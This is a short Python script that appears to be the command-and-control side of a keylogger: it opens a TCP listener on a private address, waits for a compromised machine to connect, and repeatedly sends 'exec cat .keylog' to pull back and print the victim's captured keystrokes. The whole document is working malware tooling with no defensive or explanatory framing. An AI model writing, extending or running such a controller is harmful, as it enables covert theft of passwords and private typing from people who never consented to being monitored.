import socket

HOST = "192.168.24.5"
PORT = 20030

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()

okeylogs = ""

while True:
    input("Press any key...")
    conn.send(b"exec cat .keylog")
    print(conn.recv(10240).decode())